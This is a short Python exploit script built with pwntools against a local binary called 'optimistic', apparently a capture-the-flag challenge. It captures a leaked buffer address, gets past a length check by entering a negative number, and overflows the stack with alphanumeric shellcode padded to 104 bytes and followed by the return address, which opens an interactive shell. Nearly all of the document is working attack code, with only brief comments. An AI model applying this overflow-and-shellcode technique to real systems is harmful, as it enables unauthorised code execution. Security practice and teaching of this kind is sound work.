from pwn import *

## Connect to Program
io = process("./optimistic")

## Receive Buffer Location
io.sendline(b'y')
io.recvuntil("Great! Here's a small welcome gift: ")
buffer_ad = int(io.recvline(), 16) - 96 ## Minus offset for start of buffer

## Fill in Remaining Fields
io.sendline(b'AAAA')
io.sendline(b'6')
io.sendline(b'-1') ## Use Negative to bypass comparison

## Craft Shellcode and Send
shellcode = b""
shellcode += b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
shellcode += b"0"*(104-len(shellcode))
shellcode += p64(buffer_ad)
io.sendline(shellcode)

## Receive Flag
io.interactive()